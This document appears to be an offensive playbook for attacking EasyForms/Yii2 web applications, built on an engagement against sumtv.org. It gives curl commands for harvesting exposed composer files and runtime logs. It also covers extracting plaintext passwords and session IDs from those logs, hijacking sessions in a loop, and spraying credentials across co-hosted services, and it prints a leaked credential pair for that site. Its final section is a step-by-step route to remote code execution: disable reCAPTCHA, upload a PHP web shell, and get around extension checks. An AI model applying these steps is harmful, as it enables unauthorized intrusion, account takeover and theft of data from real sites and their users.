# EasyForms / Yii2 Reconnaissance Methodology

EasyForms (by baluart) runs on Yii2 PHP framework. The default nginx config
often leaves sensitive files world-readable. This reference documents the
high-value recon paths discovered during the sumtv.org engagement.

## File Inventory (check in order of ROI)

| Path | Typical Status | Value |
|------|---------------|-------|
| `/composer.json` | 200 (JSON) | Package name, version, ALL dependency constraints |
| `/composer.lock` | 200 (JSON) | EXACT installed versions of every package |
| `/runtime/logs/app.log` | 200 (text) | Full PHP `$_SERVER`, SQL queries, usernames, stack traces |
| `/config/db.php` | 200 but Size:0 | PHP executes → no output. Use backup files or debug data |
| `/config/web.php` | 500 | PHP error — may leak partial config in output |
| `/config/params.php` | 200 but Size:0 | Same as db.php — PHP processed |
| `/index.php?r=debug` | 200 (login page) | Debug ENABLED but gated behind auth. 200 ≠ accessible |
| `/index.php?r=gii` | 200 (login page) | Gii ENABLED but gated behind auth |

## composer.json Intelligence

```bash
curl -sk 'https://TARGET/composer.json' | python3 -m json.tool
```

Key fields to extract:
- `name`: "baluart/easyforms" confirms EasyForms
- `version`: "2.4" — version number for CVE matching
- `require`: PHP version constraint, Yii2 version, payment processors
- `require-dev`: Debug/gii presence confirms dev tools installed
- `repositories`: Custom packages (baluart forks)

Real-world example (sumtv.org):
- name: baluart/easyforms v2.4
- php >=7.3, yiisoft/yii2 ~2.0
- Custom packages: baluart/yii2-usuario, baluart/yii2-swiftmailer
- Debug tools: yiisoft/yii2-debug ~2.1, yiisoft/yii2-gii ~2.1
- Payment: stripe, paypal, adyen, sendgrid, AWS SDK

## composer.lock Intelligence

```bash
curl -sk 'https://TARGET/composer.lock' | python3 -c "
import json, sys
d = json.load(sys.stdin)
for p in d.get('packages', []) + d.get('packages-dev', []):
    if 'yii2' in p.get('name', '').lower():
        print(f'{p[\"name\"]}: {p[\"version\"]}')
"
```

This reveals the EXACT versions for CVE matching:
- yiisoft/yii2: 2.0.53 (core framework)
- yiisoft/yii2-debug: 2.1.27 (debug module)
- yiisoft/yii2-gii: 2.2.7 (code generator)
- kartik-v/yii2-widget-fileinput: 1.1.1 (file upload)
- baluart/yii2-usuario: dev-master (user management / Da\User fork)

## runtime/logs/app.log Intelligence

The app log is the SINGLE HIGHEST-VALUE unauth file on EasyForms targets.
It's often world-readable because nginx serves `runtime/` as static files.

### What the log contains:
1. **PHP `$_SERVER` arrays** — DOCUMENT_ROOT, SERVER_ADDR, PHP_VALUE config
2. **SQL queries** — reveals table names (`efuser`), DB names (`sudbforms`)
3. **Usernames/emails** — from login attempt error messages
4. **Stack traces** — exact file paths on disk, vendor paths
5. **DB connection errors** — reveals host, user, database name
6. **SMTP errors** — reveals email addresses, mail server config

### Real-world intelligence extracted (sumtv.org):
- DOCUMENT_ROOT: `~/htdocs/forms.sumtv.org`
- Server user: `sumtv-forms`
- Server: nginx/1.28.0 behind proxy
- DB name: `sudbforms`
- User table: `efuser`
- User found: `user@example.com`
- SMTP user: `user@example.com` (Google Workspace)
- PHP: memory_limit=512M, upload_max_filesize=64M, display_errors=Off
- GeoIP: Seattle, WA (AWS us-west-2)

### Search patterns for app.log:
```bash
# Find users
curl -sk 'https://TARGET/runtime/logs/app.log' | grep -iE 'email.*@|efuser.*WHERE'

# Find DB config
curl -sk 'https://TARGET/runtime/logs/app.log' | grep -iE 'mysql:|DSN|dbname|host='

# Find SMTP/email config
curl -sk 'https://TARGET/runtime/logs/app.log' | grep -iE 'smtp|swift|mail|authenticate'

# Find session data
curl -sk 'https://TARGET/runtime/logs/app.log' | grep -iE 'SESSION|PHPSESSID|_identity'
```

## Yii2 Debug Route Behavior (PITFALL)

**All Yii2 debug/gii routes return HTTP 200 but display the login page.**

This is because the `Da\User` module's access control redirects unauthenticated
requests to the login form. The routes are FUNCTIONAL but gated.

Routes to test:
- `/index.php?r=debug/default/index`
- `/index.php?r=debug/default/view`
- `/index.php?r=debug/default/db-explain`
- `/index.php?r=debug/default/toolbar`
- `/index.php?r=gii`
- `/index.php?r=user/registration`
- `/index.php?r=user/forgot`

**Do NOT interpret HTTP 200 as "accessible."** Always check response body for
"Login to your account" or "Sign in" to confirm auth gating.

## Attack Chain (when fully auth-gated with no creds)

1. **PRIORITY: Extract passwords from app.log** — this is the #1 technique.
   `grep -oP "'password'\s*=>\s*'\K[^']+"` → see Password Extraction below
2. Extract usernames from app.log (`grep -iE 'email.*@|efuser.*WHERE'`)
3. Spray extracted passwords + usernames against EasyForms login
4. Try password reset for each user (may leak user existence via timing)
5. Check if `/index.php?r=user/registration` allows open registration
6. Search app.log for session IDs or `_identity` cookies from past logins
   (see Session Hijack from app.log below)
7. Extract exact Yii2 version from composer.lock → search CVEs
8. Check co-hosts on same IP for weaker apps (Portainer, CloudPanel, etc.)
9. If one co-host gives RCE → read EasyForms config files from disk
10. **CREDENTIAL SPRAY:** Any valid password → test on ALL services (MODX,
    Strapi, CloudPanel, Portainer, MySQL, SSH, FTP). See `references/credential-spray.md`.

### Password Extraction from Yii2 Runtime Logs (CRITICAL)

Yii2 error entries dump PHP `$_POST` arrays with passwords BEFORE hashing.
```bash
curl -sk URL/runtime/logs/app.log | grep -oP "'password'\s*=>\s*'\K[^']+" | sort -u
```
On sumtv.org: 13 passwords extracted from 247K-line log, one worked:
`user@example.com` / `ygb6QNV!gjz1vxg_umh` → EasyForms auth.

**PITFALL — Mix of hashes and plaintext:** Logs contain both bcrypt hashes
(60-char `$2y$13$...`) AND plaintext from form submissions. Filter by length:
hashes ≥60 chars, plaintext usually 8-30 chars. Both appear in the same file.

### Session Hijack from Yii2 Runtime Logs

When `runtime/logs/app.log` is world-readable and contains `$_SESSION` or
`$_COOKIE` dumps from error entries, you can extract PHPSESSID values and
test them for still-valid sessions.

**Step 1: Extract unique PHPSESSIDs**
```bash
curl -sk 'https://TARGET/runtime/logs/app.log' | grep -oP 'PHPSESSID=\K[a-zA-Z0-9]+' | sort -u > /tmp/sids.txt
```

**Step 2: Test each session against admin routes**
```bash
while read sid; do
  code=$(curl -sk -b "PHPSESSID=$sid" "https://TARGET/index.php?r=admin" \
    -w '%{http_code}' -o /tmp/sh_${sid:0:16}.html)
  grep -q 'Login to your account' /tmp/sh_${sid:0:16}.html || \
    echo "POSSIBLE HIT: $sid"
done < /tmp/sids.txt
```

**Step 3: Prioritize sessions from authenticated routes**
Sessions found near `actionLogin`, `Da\User`, or admin-route log entries are
more likely to be from authenticated users. Search the log context:
```bash
curl -sk 'https://TARGET/runtime/logs/app.log' | grep -B5 -A5 'PHPSESSID' | \
  grep -E 'PHPSESSID|Da\\User|admin|form|dashboard|_identity'
```

**PITFALL — Sessions may be expired:** Most PHPSESSIDs in error logs are from
unauthenticated users or have since expired (Yii2 default session lifetime is
1440s). Test at least 20 sessions. If none work, the log may not contain
authenticated-session errors — pivot to credential spray or registration.

**PITFALL — Session IP binding:** Some Yii2 configs bind sessions to IP.
If the session was created from a different IP, it may be rejected even if
still valid. Use the same proxy/exit as the original request if you can
identify it from the log's `REMOTE_ADDR`.

## Database Schema (from app.log analysis)

Known EasyForms tables:
- `efuser` — user accounts (email, password hash, role)
- Database name varies (e.g., `sudbforms` on sumtv.org)

User module: `Da\User` (fork of 2amigos/yii2-usuario by baluart)
Controller: `Da\User\Controller\SecurityController->actionLogin()`
Login form: `LoginForm[login]` (email), `LoginForm[password]`, `LoginForm[rememberMe]`
CSRF: Standard Yii2 `_csrf` cookie + `csrf-token` meta tag

## Form Embed API Discovery (CRITICAL)

When the EasyForms app is embedded on another site (e.g., sumtv.org embeds
forms.sumtv.org), the parent page contains inline JS with the form configuration
that reveals API endpoints:

```bash
# On the main site (NOT the EasyForms host), extract form config:
curl -sk 'https://PARENT_SITE/' | grep -i 'easyforms\|forms\.\|form\.widget'
```

This reveals the EasyForms subdomain AND the form embed JS which contains:

```javascript
var options = {
  "id": 6,
  "hashId": "fQBIOw",
  "app": "//forms.TARGET/app",
  "actionUrl": "https://forms.TARGET/app/f?id=fQBIOw",
  "validationUrl": "https://forms.TARGET/app/check?id=fQBIOw",
  "_csrf": "fldc6EbTtkbOlcpI...",
  "fieldIds": ["selectlist_1", "text_1", "email_1", "textarea_1", "button_1"],
  "reCaptchaSiteKey": "6LesNwMrAAAA...",
  ...
};
```

Key fields to extract:
- `actionUrl` — the backend endpoint for form submission (POST target for RCE)
- `validationUrl` — backend validation endpoint (check for bypasses)
- `fieldIds` — lists all form fields; look for file upload field names
- `_csrf` — CSRF token for form submission (may be reusable)
- `reCaptchaSiteKey` — if present, reCAPTCHA may block automated submission
- `app` root — the EasyForms app base URL

**PITFALL — Form may lack file upload fields:** The embedded form on sumtv.org
had `selectlist_1`, `text_1`, `email_1`, `textarea_1`, `button_1` — no file
upload. To exploit via file upload, you need a form WITH file upload OR you
need to access the form builder (admin) or profile upload (user settings).

## Post-Auth SPA Behavior (PITFALL)

**All authenticated routes return the same SPA shell.** After login, EVERY
route (`/index.php?r=form/create`, `/index.php?r=debug`, `/index.php?r=gii`,
`/index.php?r=user/settings/profile`) returns the exact same HTML shell
(70347 bytes on sumtv.org) with `<title>Dashboard | SUMtv Forms</title>`.

The actual UI is client-side JavaScript routing. The PHP backend serves ONE
shell page and the JS SPAs handle all navigation. This means:

1. **You cannot grep for "debug" or "gii" in response body** — they won't appear
2. **File upload POSTs return the SPA shell** even when uploads succeed
3. **The real API endpoints are in the JS bundles** — extract from theme JS files
4. **Non-admin users get the same shell as admins** — the JS hides admin features

To find actual API endpoints:
```bash
# Extract JS files loaded by the SPA
curl -sk -b 'PHPSESSID=SID' 'https://forms.TARGET/' | grep -oP 'src="/[^"]*js[^"]*"'

# Download and search for API routes
curl -sk 'https://forms.TARGET/themes/next/assets/js/app.min.js' | \
  grep -oE '(url|path|route|endpoint|api)["\x27: ]+["\x27/][^"\x27, ]+'
```

**PITFALL — Direct POST to PHP routes often accepted:** Even though the SPA
handles routing client-side, POSTing form data directly to PHP routes (e.g.,
`/index.php?r=user/settings/profile`) with proper CSRF may still work — the
Yii2 backend processes the request regardless of how the user navigated there.

Browser-based interaction is required for the form builder's drag-and-drop
UI. See the RCE via Form Builder section below for the browser workflow.

## RCE via Form Builder File Upload (CRITICAL — ADMIN REQUIRED)

When admin credentials are obtained, the fastest RCE path is through the
EasyForms form builder's File Upload field. This places uploaded files at
`/static_files/uploads/` where they can be accessed and executed.

### Prerequisites
- Admin access to EasyForms dashboard
- A stable browser (the form builder uses drag-and-drop JS)

### Workflow
1. **Login** → Navigate to EasyForms dashboard
2. **Forms** → "Create new form" button
3. **Fields tab** → Drag "File Upload" field onto the form canvas
4. **Settings tab** → Set Form Name, **disable reCAPTCHA** (critical!)
5. **Settings tab** → Set form Status to Active, Sharing to "Everyone"
6. **Save Form** → Note the form hashId or URL
7. **Navigate to form** → As a regular user (or incognito), fill and submit
8. **Upload PHP shell** via the file field: `shell.php` with `<?php system($_GET["c"]); ?>`
9. **Access shell** at `/static_files/uploads/[filename].php?c=id`

### Alternative: Background Image Upload

The Design panel (right sidebar in form builder) has a Background Image
section. If image validation is weak, a PHP file disguised as PNG (GIF header
bypass) can be uploaded through this path:
1. Form Builder → Design panel (right sidebar) → Global → Background
2. Select "Images" radio → upload PHP with `GIF89a` header and `.php` extension
3. Access at potential path: `/static_files/themes/[name]/[filename].php`

### PITFALL — reCAPTCHA blocks automated submission

If the form has reCAPTCHA enabled (default for new forms), automated
submission returns:
```json
{"success":false,"errors":[{"field":"recaptcha_1","messages":["The captcha is a required field."]}]}
```
Always disable reCAPTCHA in Form Settings before saving (checkbox: "Disable form elements"
→ uncheck reCAPTCHA, or remove the reCAPTCHA field in the Fields tab).

### PITFALL — File extension validation

EasyForms may validate file extensions. Test multiple extensions:
`.php`, `.phtml`, `.phar`, `.php5`, `.pht`, `.shtml`.
Also try double extensions: `shell.php.png` or nullbyte: `shell.php\x00.png`.
If MIME validation blocks PHP, use GIF header bypass (8 bytes: `GIF89a;`).